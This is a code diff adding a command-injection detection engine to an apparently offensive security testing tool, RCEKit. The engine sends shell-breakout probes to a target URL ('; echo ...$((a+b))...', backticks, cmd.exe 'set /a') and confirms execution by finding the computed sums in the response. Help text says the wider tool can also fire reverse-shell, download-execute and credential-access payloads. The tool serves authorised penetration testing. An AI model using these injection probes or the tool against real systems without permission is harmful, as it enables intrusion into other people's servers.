@@ -26,7 +26,7 @@ logger = logging.getLogger(__name__)
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.9.0"
+__version__ = "2.10.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -1487,6 +1487,29 @@ class RCEKit:
                 continue
         return any(re.search(pattern, c) for c in candidates)
 
+    def _fire(self, payload: str, url: str, method: str, data: Optional[str],
+              headers: Optional[List[str]], url_location: str, body_location: str,
+              timeout: float) -> Tuple[Optional[int], str, float]:
+        """Deliver one request with ``payload`` substituted at the FUZZ marker(s),
+        encoded independently for each injection point. Returns
+        ``(status, body, elapsed)`` — ``status`` is ``None`` on a delivery error
+        or timeout. Shared delivery layer for ``run_verification`` and the
+        method-driven detection engine so both encode payloads identically."""
+        import time
+        import urllib.request
+        import urllib.error
+        target, body, hdrs = self._build_verify_request(
+            payload, url, data, headers, url_location, body_location)
+        request = urllib.request.Request(target, data=body, headers=hdrs, method=method)
+        start = time.time()
+        try:
+            with urllib.request.urlopen(request, timeout=timeout) as response:
+                return response.status, response.read().decode(errors="replace"), time.time() - start
+        except urllib.error.HTTPError as exc:
+            return exc.code, exc.read().decode(errors="replace"), time.time() - start
+        except Exception as exc:  # network error, timeout, etc.
+            return None, str(exc), time.time() - start
+
     def run_verification(self, records: Iterator[PayloadRecord], url: str, method: str = "GET",
                          data: Optional[str] = None, headers: Optional[List[str]] = None,
                          delay: float = 0.0, timeout: float = 8.0,
@@ -1501,25 +1524,14 @@ class RCEKit:
         given), and single-line escaping for headers.
         """
         import time
-        import urllib.request
-        import urllib.error
 
         resolved_body_location = body_location or self._detect_body_location(data, headers)
         if data is not None:
             logger.info("Verification body injected as '%s'", resolved_body_location)
 
         def fire(payload: str, req_timeout: Optional[float] = None):
-            target, body, hdrs = self._build_verify_request(
-                payload, url, data, headers, url_location, resolved_body_location)
-            request = urllib.request.Request(target, data=body, headers=hdrs, method=method)
-            start = time.time()
-            try:
-                with urllib.request.urlopen(request, timeout=req_timeout or timeout) as response:
-                    return response.status, response.read().decode(errors="replace"), time.time() - start
-            except urllib.error.HTTPError as exc:
-                return exc.code, exc.read().decode(errors="replace"), time.time() - start
-            except Exception as exc:  # network error, timeout, etc.
-                return None, str(exc), time.time() - start
+            return self._fire(payload, url, method, data, headers, url_location,
+                              resolved_body_location, req_timeout or timeout)
 
         # Baseline from several benign requests: a single sample can be a cold
         # start or a jitter spike, which would poison every timing verdict. Take
@@ -1589,6 +1601,77 @@ class RCEKit:
                 time.sleep(delay)
             if max_payloads and len(results) >= max_payloads:
                 break
+        return results
+
+    def run_detection(self, records: Iterator[PayloadRecord], url: str,
+                      methods: List[str], method: str = "GET",
+                      data: Optional[str] = None, headers: Optional[List[str]] = None,
+                      delay: float = 0.0, timeout: float = 8.0,
+                      max_payloads: Optional[int] = None,
+                      url_location: str = "query_value",
+                      body_location: Optional[str] = None,
+                      rng: Optional["random.Random"] = None) -> List[Dict[str, Any]]:
+        """Method-driven RCE detection against an AUTHORISED target.
+
+        For each selected :class:`DetectionMethod`, build probes from the
+        applicable records, fire them through the shared delivery layer
+        (:meth:`_fire`), and confirm each against a single payload-free control
+        body. Every result carries ``method`` and ``tier`` so the two tiers
+        (``confirmed`` vs ``needs-review``) are never collapsed in reporting.
+
+        This is additive: it does not alter the classic ``run_verification``
+        oracle path, and only runs when the operator opts in via ``--methods``.
+        """
+        import time
+        rng = rng or random.Random()
+        resolved_body_location = body_location or self._detect_body_location(data, headers)
+        selected = [DETECTION_METHODS[name](self) for name in methods
+                    if name in DETECTION_METHODS]
+
+        # One payload-free control body for the reflection differential: the
+        # computed value must be absent here for a confirmation to hold.
+        _, control_body, _ = self._fire(
+            f"rcekit-control-{self._generate_canary()}", url, method, data, headers,
+            url_location, resolved_body_location, timeout)
+
+        # Reduce records to distinct (environment, context) carriers so the same
+        # probe shape is not refired for every payload sharing that carrier.
+        carriers: List[PayloadRecord] = []
+        carrier_seen: Set[Tuple[str, str]] = set()
+        for record in records:
+            key = (record.environment, record.context)
+            if key in carrier_seen:
+                continue
+            carrier_seen.add(key)
+            carriers.append(record)
+
+        results: List[Dict[str, Any]] = []
+        seen: Set[str] = set()
+        for meth in selected:
+            for record in carriers:
+                if not meth.applicable(record):
+                    continue
+                for probe in meth.build_probes(record, rng):
+                    if probe.payload in seen:
+                        continue
+                    seen.add(probe.payload)
+                    status, body, elapsed = self._fire(
+                        probe.payload, url, method, data, headers, url_location,
+                        resolved_body_location, timeout)
+                    obs = Observation(status=status, body=body, control_body=control_body,
+                                      elapsed=elapsed)
+                    verdict = meth.confirm(obs, probe)
+                    results.append({
+                        "verdict": verdict.status, "detail": verdict.evidence,
+                        "status": status, "payload": probe.payload,
+                        "method": meth.name, "tier": meth.tier,
+                        "environment": record.environment, "context": record.context,
+                        "category": "detection", "expected": probe.expected,
+                    })
+                    if delay:
+                        time.sleep(delay)
+                    if max_payloads and len(results) >= max_payloads:
+                        return results
         return results
 
     def run_verification_chain(self, records: Iterator[PayloadRecord], chain: Dict[str, Any],
@@ -1872,6 +1955,184 @@ class OOBListener:
         return True
 
 
+# ===========================================================================
+# Detection methods — multi-method, low-false-positive RCE *detection* engine
+#
+# A small, additive oracle abstraction layered on top of the existing verify
+# machinery. Each method turns a target response into a Verdict whose
+# ``confirmed`` tier means the target *computed or executed* a value RCEKit
+# chose at random — never a literal the payload already carried (the
+# confirmation invariant). Every confirmation is differenced against a
+# payload-free control, exactly as _evaluate_verify already does.
+#
+# Methods are opt-in via ``--methods``; the classic --verify-url path is
+# unchanged when no method is selected. Confirmed-tier (execution proven) and
+# needs-review-tier (candidate) verdicts are never merged.
+# ===========================================================================
+
+# Shell environments whose payloads ReflectedMath can force to compute a value.
+UNIX_SHELL_ENVIRONMENTS = {"unix", "docker", "kubernetes"}
+
+
+@dataclass
+class Probe:
+    """One request RCEKit will send, plus the values it computed *locally* to
+    decide the verdict. ``expected`` is the string only execution can produce
+    (an arithmetic result on random operands, tag-bracketed); ``forbidden``, if
+    present, is the literal that survives only when the target *reflected* the
+    payload instead of running it."""
+    payload: str
+    expected: str
+    forbidden: Optional[str] = None
+    followup: Optional[Dict[str, Any]] = None
+    delay_s: Optional[float] = None
+
+
+@dataclass
+class Verdict:
+    """A method's decision. ``status`` is one of ``confirmed`` (execution
+    proven), ``needs-review`` (candidate), ``negative`` (no evidence), or
+    ``inconclusive`` (evidence not attributable to execution)."""
+    status: str
+    evidence: str
+
+
+@dataclass
+class Observation:
+    """The target's response(s) to one probe, plus the payload-free control the
+    verdict is differenced against. ``status is None`` means the delivery
+    request errored or timed out."""
+    status: Optional[int]
+    body: str
+    control_body: str = ""
+    elapsed: float = 0.0
+    baseline: float = 0.0
+    followup_body: Optional[str] = None
+
+
+class DetectionMethod:
+    """Base oracle. Subclasses declare a ``name``/``tier``, decide which records
+    they apply to, build probes with locally-computed expected values, and turn
+    an Observation into a Verdict. Kept deliberately plain (no ABC) so it runs
+    unchanged on Python 3.8."""
+    name = "base"
+    tier = "confirmed"
+
+    def __init__(self, gen: "RCEKit"):
+        self.gen = gen
+
+    def applicable(self, record: "PayloadRecord") -> bool:
+        raise NotImplementedError
+
+    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
+        raise NotImplementedError
+
+    def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
+        raise NotImplementedError
+
+    def _search(self, literal: str, body: str) -> bool:
+        """Encoded-aware literal search. Reuse the generator's ``_encoded_search``
+        (additive: raw body first, then common output wrappers) so a sink that
+        base64/hex/url/html-encodes the output still confirms. ``literal`` is
+        matched verbatim, not as a regex."""
+        if not literal or not body:
+            return False
+        return self.gen._encoded_search(re.escape(literal), body)
+
+
+class ReflectedMath(DetectionMethod):
+    """Results-based confirmation (highest value). Force the target's shell to
+    compute an arithmetic value on random operands and collapse a nested
+    substitution, then confirm that value appears in the response and NOT in a
+    payload-free control.
+
+    Reflection cannot fake it: a target that merely echoes the payload returns
+    the literal ``$((a+b))``, never the sum. Two independent proofs ride in one
+    Unix probe — (1) arithmetic on random operands, and (2) a ``$(echo TAG)``
+    substitution collapse that proves the shell *ran* the substitution rather
+    than echoing it."""
+    name = "reflected"
+    tier = "confirmed"
+
+    def applicable(self, record: "PayloadRecord") -> bool:
+        return (record.environment in UNIX_SHELL_ENVIRONMENTS
+                or record.environment == "windows")
+
+    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
+        a = rng.randint(100000, 999999)
+        b = rng.randint(100000, 999999)
+        total = a + b
+        t1, t2, t3 = self._tag(rng), self._tag(rng), self._tag(rng)
+        probes: List[Probe] = []
+        if record.environment == "windows":
+            # `set /a` is cmd.exe's arithmetic builtin; `for /f` captures its
+            # output so the computed value lands in the response.
+            arith = f"set /a {a}+{b}"
+            core = f'for /f "delims=" %i in (\'{arith}\') do @echo {t1}%i{t2}'
+            probes.append(Probe(
+                payload=self._wrap(record, core, windows=True),
+                expected=f"{t1}{total}{t2}",
+                forbidden=arith,
+            ))
+        else:
+            # $(( )) arithmetic + $() substitution collapse, one probe.
+            arith = f"$(({a}+{b}))"
+            core = f"echo {t1}{arith}{t2}$(echo {t3}){t1}"
+            probes.append(Probe(
+                payload=self._wrap(record, core),
+                expected=f"{t1}{total}{t2}{t3}{t1}",
+                forbidden=arith,
+            ))
+            # Backtick variant: same proof via a different substitution syntax,
+            # so a sink that strips `$(` is still reached.
+            bt = f"`expr {a} + {b}`"
+            core_bt = f"echo {t1}{bt}{t2}"
+            probes.append(Probe(
+                payload=self._wrap(record, core_bt),
+                expected=f"{t1}{total}{t2}",
+                forbidden=bt,
+            ))
+        return probes
+
+    def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
+        if obs.status is None and not obs.body:
+            return Verdict("inconclusive", "no response from target (delivery error)")
+        if not self._search(probe.expected, obs.body):
+            return Verdict("negative", "computed value absent from the response")
+        if probe.forbidden and self._search(probe.forbidden, obs.body):
+            # The literal expression survived next to the value: the sink echoed
+            # the payload rather than running it cleanly. Refuse to confirm.
+            return Verdict("needs-review",
+                           "computed value present, but the literal expression was also reflected")
+        if obs.control_body and self._search(probe.expected, obs.control_body):
+            # Present without the payload too — not attributable to execution.
+            return Verdict("inconclusive",
+                           "computed value also present in the payload-free control")
+        return Verdict("confirmed",
+                       f"target computed {probe.expected!r} (random operands, absent from control)")
+
+    def _tag(self, rng: "random.Random") -> str:
+        """A distinctive letters-only boundary marker. Letters keep it from
+        blurring into the digit run of the arithmetic result."""
+        return "RK" + "".join(rng.choice(string.ascii_uppercase) for _ in range(5))
+
+    def _wrap(self, record: "PayloadRecord", core: str, windows: bool = False) -> str:
+        """Break out of the running command with a separator, then escape the
+        probe for the record's serialization context — reusing the same
+        context/escape machinery the generator uses for every other payload."""
+        ctx = self.gen.contexts.get(record.context, {"prefix": "", "suffix": "", "escape": "none"})
+        body = f"{' & ' if windows else '; '}{core}"
+        escaped = self.gen._escape_for_context(body, ctx.get("escape", "none"))
+        return f"{ctx.get('prefix', '')}{escaped}{ctx.get('suffix', '')}"
+
+
+# The detection methods RCEKit can run, keyed by their --methods name. Adding a
+# phase = adding a class above and an entry here.
+DETECTION_METHODS = {
+    ReflectedMath.name: ReflectedMath,
+}
+
+
 # Categories whose payloads have a real-world side effect when fired at a live
 # target (an outbound connection, a callback, credential access, a foothold),
 # as opposed to read-only enumeration. Surfaced in the verification plan and
@@ -1999,6 +2260,11 @@ def main():
                              "back reverse shells, download-execute, credential access, lateral movement, "
                              "container escape, cloud-metadata and OOB payloads; pass 'intrusive' to include "
                              "them. Independent of --max-safety, which only governs file output")
+    parser.add_argument("--methods", default=None,
+                        help="Comma-separated RCE detection methods to run against --verify-url instead of "
+                             "the classic per-payload oracle. Available: reflected (results-based execution "
+                             "proof via computed arithmetic). Opt-in and additive: when omitted, --verify-url "
+                             "keeps its existing behaviour unchanged.")
     parser.add_argument("--verify-chain", default=None,
                         help="Path to a JSON chain profile: deliver each payload through a multi-step, "
                              "session-aware flow (login/CSRF -> prerequisites -> payload delivery -> trigger) "
@@ -2252,6 +2518,45 @@ def main():
             print("[plan] low-impact (safe) payloads only; pass --verify-active-risk intrusive to also "
                   "fire reverse shells, download-execute, credential access, lateral movement and OOB.")
         print(f"[verify] {method} {args.verify_url}  (authorised target)")
+        # Opt-in, method-driven detection. Additive: without --methods the
+        # classic per-payload oracle below runs exactly as before. Confirmed and
+        # needs-review tiers are reported separately and never merged.
+        if args.methods:
+            method_names = [m.strip() for m in args.methods.split(",") if m.strip()]
+            unknown = [m for m in method_names if m not in DETECTION_METHODS]
+            if unknown:
+                print(f"[!] Unknown --methods: {', '.join(unknown)}. "
+                      f"Available: {', '.join(sorted(DETECTION_METHODS))}.")
+                return
+            results = generator.run_detection(
+                to_send, url=args.verify_url, methods=method_names, method=method,
+                data=args.verify_data, headers=args.verify_header, delay=args.verify_delay,
+                timeout=args.verify_timeout, max_payloads=args.max_payloads,
+                url_location=args.verify_url_location, body_location=args.verify_body_location,
+            )
+            by_verdict = {}
+            for result in results:
+                by_verdict[result["verdict"]] = by_verdict.get(result["verdict"], 0) + 1
+            print(f"[detect] methods: {', '.join(method_names)}")
+            print(f"[detect] sent {len(results)} probes: " +
+                  (", ".join(f"{v}={c}" for v, c in sorted(by_verdict.items())) or "none"))
+            confirmed = [r for r in results if r["verdict"] == "confirmed"]
+            if confirmed:
+                print(f"\n[detect] CONFIRMED execution ({len(confirmed)}):")
+                for result in confirmed:
+                    print(f"  [{result['method']}/{result['environment']}/{result['context']}] "
+                          f"{result['payload']}   ({result['detail']})")
+            needs_review = [r for r in results if r["verdict"] == "needs-review"]
+            if needs_review:
+                print(f"\n[detect] {len(needs_review)} NEEDS-REVIEW candidates "
+                      "(not proof of execution — review manually):")
+                for result in needs_review:
+                    print(f"  [{result['method']}/{result['environment']}/{result['context']}] "
+                          f"{result['payload']}   ({result['detail']})")
+            if not confirmed:
+                print("\n[detect] No execution confirmed. The target may be patched, or the probes "
+                      "may not fit its sink/context (try --environments/--contexts).")
+            return
         results = generator.run_verification(
             to_send, url=args.verify_url, method=method, data=args.verify_data,
             headers=args.verify_header, delay=args.verify_delay, timeout=args.verify_timeout,
